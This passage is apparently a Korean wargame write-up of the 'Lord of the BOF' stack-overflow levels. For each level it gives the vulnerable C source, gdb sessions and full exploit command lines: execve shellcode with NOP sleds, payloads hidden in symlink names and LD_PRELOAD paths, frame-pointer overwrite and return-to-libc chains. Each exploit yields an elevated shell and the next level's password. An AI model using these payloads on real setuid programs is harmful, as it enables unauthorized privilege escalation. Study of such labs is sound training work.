0x8048506 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   $0x8048690
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    $0x4,%esp
0x8048519 <main+25>:	push   $0x0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    $0x4,%esp
0x8048523 <main+35>:	mov    0xc(%ebp),%eax
0x8048526 <main+38>:	mov    (%eax),%edx
0x8048528 <main+40>:	push   %edx
0x8048529 <main+41>:	call   0x80483f0 <strlen>
0x804852e <main+46>:	add    $0x4,%esp
0x8048531 <main+49>:	mov    %eax,%eax
0x8048533 <main+51>:	cmp    $0x4d,%eax
0x8048536 <main+54>:	je     0x8048550 <main+80>
0x8048538 <main+56>:	push   $0x804869c
0x804853d <main+61>:	call   0x8048410 <printf>
0x8048542 <main+66>:	add    $0x4,%esp
0x8048545 <main+69>:	push   $0x0
0x8048547 <main+71>:	call   0x8048420 <exit>
0x804854c <main+76>:	add    $0x4,%esp
0x804854f <main+79>:	nop    
0x8048550 <main+80>:	nop    
0x8048551 <main+81>:	movl   $0x0,0xffffffd4(%ebp)
0x8048558 <main+88>:	mov    0xffffffd4(%ebp),%eax
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b *main+6
Breakpoint 1 at 0x8048506
(gdb) r `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/darkelf/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`

Breakpoint 1, 0x8048506 in main ()
(gdb) x/wx $ebp+0xc
0xbffff8b4:	0xbffff8f4
(gdb) x/wx 0xbffff8f4+8
0xbffff8fc:	0xbffffa72
(gdb) x/s 0xbffffa72
0xbffffa72:	 'A' <repeats 200 times>...
```

argv[2]의 주소는 0xbffffa72 임을 알 수 있다.

argv[1] = "A"*44 (dummy byte)
+"\x72\xfa\xff\xbf" (shellcode addr)

argv[2] = "\x90"*200 (Nop Sled)
+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" (shellcode)
+"\x90"*200 (Nop Sled)

``` bash2
[darkelf@localhost darkelf]$ ~/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c 'print "A"*44+"\x72\xfa\xff\xbf"'` `python -c 'print "\x90"*200+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*200'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAr?
bash$ id
uid=506(darkelf) gid=506(darkelf) euid=507(orge) egid=507(orge) groups=506(darkelf)
bash$ my-pass
euid = 507
timewalker
```

# orge

password is timewalker

### Problem

``` bash2
[orge@localhost orge]$ cat troll.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

### Solution

많은 부분이 막혀있다. 환경변수도 제거되고 buffer의 앞부분도 제거되고 argv[1] 또한 제거된다. 점프를 할 수 있는 영역은 stack 영역으로 고정되어있다.

이 문제의 경우 이전 문제에서 힌트가 있다. 전 문제에서 symbolic link를 통해 argv[0]을 바꿀 수 있다는 것을 보았다. 즉 argv[0]에 쉘코드를 넣으면 된다.

``` bash2
ln -s "troll" `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x74\x6d\x70\x89\xe3\x50\x53"'`
ln: cannot create symbolic link `1픐h//shh/bin??S' to `troll': No such file or directory
```

그러나 에러가 나는 모습을 확인할 수 있다. 이는 링크 걸 파일 이름에 "/" 가 있어서 생기는 오류이다.

이걸 해결하기위해 / 단위로 디렉토리와 링크 파일을 만들어주어야한다.

하지만 사용하는 쉘코드를 보면 /가 2번 연속되어있는 구간이 있다. 이걸 해결하기 위해 쉘코드를 약간 수정하여 /tmp/1sh를 실행하도록 바꾼 뒤 /bin/sh을 /tmp/1sh로 심볼릭 링크 걸어줄 것이다.

변형된 쉘코드는 \x90*200 + \x31\xc0\x50\x68\x2f\x31\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 + \x90*200
이고 이를 / (\x2f) 단위로 끊어서
디렉토리 \x90*200 + \x31\xc0\x50\x68
밑에 디렉토리 \x31\x73\x68\x68
밑에 링크파일 \x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 + \x90*200
를 만들 것이다.

``` gdb
[orge@localhost orge]$ mkdir `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[orge@localhost orge]$ cd `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[orge@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ mkdir `python -c 'print "\x31\x73\x68\x68"'`
[orge@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ cd 1shh/
[orge@localhost 1shh]$ cp ~/troll ~/trol2
[orge@localhost 1shh]$ ln -s ~/trol2 `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`
```

gdb를 붙여보기 위해 troll이 아닌 trol2로 복사한 뒤 링크를 했다. gdb를 통해 쉘코드의 주소를 알아보자.

(gdb) r `python -c 'print "A"*48'`
Starting program: /home/orge/????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h/1shh/tmp??S??柰
                     ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? `python -c 'print "A"*48'`

Breakpoint 1, 0x8048506 in main ()
(gdb) x/x $ebp+0xc
0xbffff6d4:	0xbffff714
(gdb) x/wx 0xbffff714
0xbffff714:	0xbffff812
(gdb) x/s 0xbffff812
0xbffff812:	 "/home/orge/", '\220' <repeats 189 times>...
(gdb) x/50bx 0xbffff812
0xbffff812:	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x6f	0x72
0xbffff81a:	0x67	0x65	0x2f	0x90	0x90	0x90	0x90	0x90
0xbffff822:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff82a:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff832:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff83a:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff842:	0x90	0x90

쉘코드의 시작주소는 0xBFFFF81D이고 앞의 놉슬레드 중간 지점은 대략 0xBFFFF81D+100 = 0xBFFFF881이다.

링크를 troll로 바꾸고 eip를 0xbffff881로 바꾸면 쉘을 얻을 수 있을 것이다.

gdb와 실제 주소가 달라 에러가 발생하는데 core를 이용해 디버깅을 해보면 쉘코드 위치가 0xbfffe52 ~~ 임을 알 수 있다. 이를 이용해 0xbffffe96로 뛰게 수정하면 쉘을 얻을 수 있다. (core를 얻으려면 디버깅 권한이 있는 trol2 바이너리를 대상으로 실행하여 Segmentation Fault를 만들어야한다.)

``` gdb
[orge@localhost 1shh]$ ln -s ~/troll `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`
[orge@localhost 1shh]$ $PWD/tmp??S??柰^K????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? `python -c 'print "A"*44+"\x95\xfe\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??
1sh: /home/orge/.bashrc: Permission denied
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
```

# troll

password is aspirin

### Problem

``` bash2
[troll@localhost troll]$ cat vampire.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

### Solution

간단하게 argv를 크게 주어서 스택 영역을 늘려서 주소를 0xbfff가 아니게 만들면 쉽게 해결할 수 있다.

``` gdb
(gdb) b *main+6
Breakpoint 3 at 0x8048436
(gdb) r `python -c 'print "A"*44+"\x30\x30\xfe\xbf"+"\x90"*32768+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*32768'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/troll/vampir2 `python -c 'print "A"*44+"\x30\x30\xfe\xbf"+"\x90"*32768+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*32768'`

Breakpoint 3, 0x8048436 in main ()
(gdb) x/x $ebp
0xbffefac8:	0xbffefae8
(gdb) x/x $ebp+0xc
0xbffefad4:	0xbffefb14
(gdb) x/wx 0xbffefb14
0xbffefb14:	0xbffefc06
(gdb) x/wx 0xbffefb18
0xbffefb18:	0xbffefc1a
(gdb) x/s 0xbffefc1a
0xbffefc1a:	 'A' <repeats 44 times>, "00", '\220' <repeats 152 times>...
```

argv[1]의 길이를 0x10000보다 크게 주어서 주소를 0xbfff로 시작하는 것이 아니라 0xbffe로 시작하도록 변형했다. 이를 통해 쉘코드 주소를 대략 0xbffefd30으로 뛰면 놉슬레드를 통해 쉘을 획득 할 수 있다.

``` bash2
~/vampire `python -c 'print "A"*44+"\x30\xfd\xfe\xbf"+"\x90"*32768+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*32768'`

bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```

# vampire

password is music world

### Problem

``` bash2
[vampire@localhost vampire]$ cat skeleton.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i, saved_argc;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	// argc saver
	saved_argc = argc;

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// ultra argv hunter!
	for(i=0; i<saved_argc; i++)
		memset(argv[i], 0, strlen(argv[i]));
}
```

### Solution

``` bash2
cp skeleton skeleto2
ln -s skeleto2 `python -c 'print "A"*100'`
```
을 통해 gdb로 A*100을 분석해보자.

``` gdb
(gdb) b *main+368
Breakpoint 1 at 0x8048670
(gdb) b *main+6  
Breakpoint 2 at 0x8048506
(gdb) r 123
Starting program: /home/vampire/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 123

Breakpoint 2, 0x8048506 in main ()
(gdb) x/x $ebp
0xbffffa38:	0xbffffa58
(gdb) x/x $ebp+0xc
0xbffffa44:	0xbffffa84
(gdb) x/wx 0xbffffa84
0xbffffa84:	0xbffffb80
(gdb) x/s 0xbffffb80
0xbffffb80:	 "/home/vampire/", 'A' <repeats 100 times>
(gdb) x/s 0xbfffff20
0xbfffff20:	 "ZE=1000"
(gdb)
0xbfffff28:	 "TERM=xterm"
(gdb)
0xbfffff33:	 "HOME=/home/vampire"
(gdb)
0xbfffff46:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/vampire/bin"
(gdb)
0xbfffff89:	 "/home/vampire/", 'A' <repeats 100 times>
(gdb)
```

gdb를 통해 메모리를 보면 실행되는 프로그램 이름 argv[0]이 argv[0] 뿐만아니라 스택의 끝에도 있음을 볼 수 있다.

이 스택 끝에 저장되는 프로그램 이름은 심볼릭 링크로 변경할 수 있으며 argv, envp 등에 의해 삭제되지 않는다. 즉 orge와 비슷하게 풀어낼 수 있다.

사용할 쉘코드는 다음과 같다. /tmp/1sh 를 실행하는 쉘코드이다.
\x90*200 + \x31\xc0\x50\x68\x2f\x31\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 + \x90*200

이고 이를 / (\x2f) 단위로 끊어서
디렉토리 \x90*200 + \x31\xc0\x50\x68
밑에 디렉토리 \x31\x73\x68\x68
밑에 링크파일 \x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 + \x90*200

``` bash2
[vampire@localhost vampire]$ mkdir `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[vampire@localhost vampire]$ cd `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[vampire@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ mkdir `python -c 'print "\x31\x73\x68\x68"'`
[vampire@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ cd 1shh/
[vampire@localhost 1shh]$ ln -s ~/skeleto2 `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`
```

gdb로 쉘코드의 주소를 알아보자.

``` gdb
(gdb) b *main+368
Breakpoint 1 at 0x8048670
(gdb) r `python -c 'print "\xbf"*48'`

(gdb)
0xbffffe44:	 "/home/vampire/", '\220' <repeats 186 times>...
```

약 0xbffffe52 + 100 = 0xbffffeb6에 있다고 가정하고 eip를 변경하면 쉘을 얻을 수 있다.

``` bash2
[vampire@localhost 1shh]$ ln -s ~/skeleton `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`
[vampire@localhost 1shh]$ $PWD/tmp??S??柰^K????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? `python -c 'print "A"*44+"\xb6\xfe\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA랗
1sh: /home/vampire/.bashrc: Permission denied
bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)
bash$ my-pass
euid = 510
shellcoder
```

# skeleton

password is shellcoder

### Problem

``` bash2
[skeleton@localhost skeleton]$ cat golem.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

### Solution

LD_PRELOAD, LD_LIBRARY_PATH 는 스택 영역인데 스택 뒤쪽이 아님;

``` bash2
[skeleton@localhost skeleton]$ cat > attack.c
[skeleton@localhost skeleton]$ gcc attack.c -fPIC -shared -o attack.so
```

아무것도 없는 so파일을 만들고 이걸 orge 때 처럼 shellcode를 담도록 파일을 이동시켜서 LD_PRELOAD가 쉘코르를 포함하도록 등록하자.

``` bash2
[skeleton@localhost skeleton]$ mkdir `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[skeleton@localhost skeleton]$ cd `python -c 'print "\x90"*200+"\x31\xc0\x50\x68"'`
[skeleton@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ mkdir `python -c 'print "\x31\x73\x68\x68"'`
[skeleton@localhost ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h]$ cd 1shh/
[skeleton@localhost 1shh]$ mv ~/attack.so `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`.so
[skeleton@localhost 1shh]$ export LD_PRELOAD="/home/skeleton/????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h/1shh/tmp??S??柰^K?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.so"
```

gdb로 쉘코드의 위치를 찾아보자.

``` bash2
(gdb) x/s 0xbffff350
0xbffff350:	 "/home/skeleton/", '\220' <repeats 23 times>, "s ?"
```

쉘코드의 위치는 대략 0xBFFFF3C3이다.

core가 발생하여 gdb로 분석하면 gdb가 아닌 진짜 주소는 0xbffff2ff 쯤에 있는 것을 알 수 있다.

이렇게 하면 쉘코드가 중간에 깨져서 오류가 난다. 이유는 정확히 모르겠으나 printf 하면서 쉘코드 중간에 이상한 숫자가 끼어들어간다. 이를 해결하기 위해 so 파일이름에서 뒷부분 Nop 크기를 100으로 줄이고 진행했다.

``` bash2
[skeleton@localhost 1shh]$ mv `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*200'`.so `python -c 'print "\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x90"*100'`.so
```

``` gdb
0xbffff4e8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff4f0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff4f8:	0x90	0x90	0x90	0x31	0xc0	0x50	0x68	0x2f
0xbffff500:	0x31	0x73	0x68	0x68	0x2f	0x74	0x6d	0x70
0xbffff508:	0x89	0xe3	0x50	0x53	0x89	0xe1	0x31	0xd2
0xbffff510:	0xb0	0x0b	0xcd	0x80
```
0xbffff4c0로 뛰도록해보자.

core를 이용해 디버깅을 한 뒤 0xbffff4b0으로 뛰도록 하자.

``` bash2
[skeleton@localhost skeleton]$ /home/skeleton/golem `python -c 'print "A"*44+"\xb0\xf4\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA곯
1sh: /home/skeleton/.bashrc: Permission denied
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
bash$ my-pass
euid = 511
cup of coffee
```

# golem

password is cup of coffee

### Problem

``` bash2
[golem@localhost golem]$ cat darkknight.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

``` bash2

[golem@localhost golem]$ /home/golem/darkknigh2 `python -c 'print "AAAA"+"\xa0\xfa\xff\xbf"+"\x90"*7+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\xa4"'`
AAAA?퓧??????1픐h//shh/bin??S??柰
                                     ?ㆊ퓹??욤?옹	@
Segmentation fault (core dumped

```

core를 이용해 분석하면 쉘코드의 위치를 정확히 알 수 있고 그에 따라 주소를 세팅해주면 된다.

``` notepad
              |   esp   |   ebp   |   eip  |
--------------------------------------------
leave         |  정상   |   변조   |  정상  |
--------------------------------------------
ret           |  정상   |   변조   |  정상  |
--------------------------------------------
add esp, 4    |  정상   |   변조   |  정상  |
--------------------------------------------
leave         | 변조+4  |  [변조]  |  정상  |
--------------------------------------------
ret           | 변조+8  |  [변조]  |[변조+4]|
--------------------------------------------
각 명령어가 끝난 뒤 레지스터의 상태이다 정상은 bof가 일어나지 않았을 경우와 같다는 것을 의미한다.
```

``` bash2
[golem@localhost golem]$ /home/golem/darkknight `python -c 'print "AAAA"+"\x9c\xfa\xff\xbf"+"\x90"*7+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x94"'`
AAAA??퓧??????1픐h//shh/bin??S??柰
                                     ???퓹??욤?옹	@
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```

# darkknight

password is new attacker

### Problem

``` bash2
[darkknight@localhost darkknight]$ cat bugbear.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack betrayed you!!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

### Solution

RTL을 이용하는 문제이다. system("/bin/sh"); 을 실행하도록 bof를 일으킬 것이며 "/bin/sh" 문자열은 argv[2]를 통해 전달해줄 것이다.

payload는 'A'*44 (dummy) + system 주소 + AAAA (dummy) + argv[2] 주소 이렇게 꾸며질 것이다.

gdb를 통해 system 주소와 argv[2]의 주소를 구해보자

``` gdb
(gdb) b *main+6
Breakpoint 1 at 0x8048436
(gdb) r `python -c 'print "A"*56'` /bin/sh     
Starting program: /home/darkknight/bugbea2 `python -c 'print "A"*56'` /bin/sh

Breakpoint 1, 0x8048436 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
(gdb) x/x $ebp+12
0xbffffaa4:	0xbffffae4
(gdb) x/x 0xbffffae4+8
0xbffffaec:	0xbffffc34
(gdb) x/s 0xbffffc34
0xbffffc34:	 "/bin/sh"
```
구성된 payload는 다음과 같다.
/home/darkknight/bugbea2 `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x34\xfc\xff\xbf"'` /bin/sh

``` bash2
[darkknight@localhost darkknight]$ /home/darkknight/bugbea2 `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x34\xfc\xff\xbf"'` /bin/sh
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@AAAA4?
sh: t: command not found
Segmentation fault (core dumped)
```

system ("t"); 가 실행되어 sh: t: command not found 가 나오는 모습을 볼 수 있다. 이를 통해 system의 인자로 넘어간 문자열의 주소가 잘못된 것을 알 수 있따.
만들어진 core를 통해 /bin/sh 즉 argv[2]의 다시 계산해서 넣어주면 될 것이다.

``` gdb
(gdb)
0xbffffc19:	 "/bin/sh"
```

core를 통해 분석한 argv[2]의 주소는 0xbffffc19이다. 이를 반영하여 payload를 구성하면
/home/darkknight/bugbea2 `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x19\xfc\xff\xbf"'` /bin/sh이다.

``` bash2
[darkknight@localhost darkknight]$ /home/darkknight/bugbea2 `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x19\xfc\xff\xbf"'` /bin/sh
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@AAAA?\
bash$ exit
exit
Segmentation fault (core dumped)
[darkknight@localhost darkknight]$ /home/darkknight/bugbear `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\x19\xfc\xff\xbf"'` /bin/sh
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@AAAA?
bash$ id    
uid=512(darkknight) gid=512(darkknight) euid=513(bugbear) egid=513(bugbear) groups=512(darkknight)
bash$ my-pass
euid = 513
new divide
```

# bugbear

password is new divide

### Problem

``` bash2
[bugbear@localhost bugbear]$ cat giant.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - giant
        - RTL2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[])
{
	char buffer[40];
	FILE *fp;
	char *lib_addr, *execve_offset, *execve_addr;
	char *ret;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// gain address of execve
	fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'", "r");
	fgets(buffer, 255, fp);
	sscanf(buffer, "(%x)", &lib_addr);
	fclose(fp);

	fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
	fgets(buffer, 255, fp);
	sscanf(buffer, "%x", &execve_offset);
	fclose(fp);

	execve_addr = lib_addr + (int)execve_offset;
	// end

	memcpy(&ret, &(argv[1][44]), 4);
	if(ret != execve_addr)
	{
		printf("You must use execve!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

### Solution

문제 조건에 의해 system이 아닌 execve를 이용해야한다.

``` gdb
(gdb) print execve
$1 = {<text variable, no debug info>} 0x400a9d48 <__execve>
```

이전 풀이처럼 접근했을 경우 한가지 문제점이 존재하는데 argv[2]로 주어진 /bin/sh의 주소를 찾기 위해 core를 분석해야하는데 이 문제의 경우 giant 권한으로 assasin 바이너리를 사용하기 때문에 core를 분석할 수 없다. 이를 해결하기 위해 system 함수 내부에서 사용하는 /bin/sh 문자열의 위치를 파악해야한다.

* system 함수는 /bin/sh -c "명령어" 의 형식으로 실행되기 때문에 내부에 /bin/sh 라는 문자열을 내포하고 있다. 이 문자열의 주소를 찾는 방법은 다음과 같다.

``` c
#include<stdio.h>
#include<stdlib.h>

int main(void)
{
	void *binsh = 0x40058ae0; // offset of system function
	while(1)
	{
		if(memcmp(binsh, "/bin/sh", 8)==0)
			break;
		binsh++;
	}
	printf("%p = %s\n",binsh,binsh);
}
```

이 소스를 컴파일하여 실행해보면 다음과 같은 결과를 얻을 수 있다.
0x400fbff9 = /bin/sh

즉 /bin/sh는 0x400fbff9에 있다는 것이다.

execve는 인자를 3개나 넘겨야 하는 불편함이 있다. 이를 해결하기 위해 간단한 RTl Chain을 이용하여 system 함수를 호출할 것이다.

``` gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```

stack 구조는 다음과 같다.

``` notepad
낮은 주소
              |   esp   |
-------------------------
mainret       | &execve |
-------------------------
execveret     | &system |
-------------------------
systemret     | dummy   |
-------------------------
system argv1  | &/bin/sh|
-------------------------
높은 주소
```

mainret 다음 주소가 execveret 인 이유는 main에서 ret을 했을 때 esp가 가리키고 있는 주소는 execveret 위치일 것이고 이것은 execve 함수 내부에서는 call을 했을 때 쌓인 ret address라고 생각할 것이기 때문이다.

payload 를 구성하면 다음과 같다.

"A"*44 (dummy) + execve 주소 + system 주소 + "AAAA" + /bin/sh 주소

/home/bugbear/giant "`python -c 'print "A"*44+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`"


여기서 문제점이 있는데 "\x0a" 는 엔터로 문자열의 끝을 의미한다. 따라서 argv[1] 전체를 "" 로 묶어주어야한다.

``` bash2
[bugbear@localhost bugbear]$ /home/bugbear/giant "`python -c 'print "A"*44+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH?
@?@AAAA廈@
bash$ id     
uid=513(bugbear) gid=513(bugbear) euid=514(giant) egid=514(giant) groups=513(bugbear)
bash$ my-pass
euid = 514
one step closer
```

# giant

password is one step closer

### Problem

``` bash2
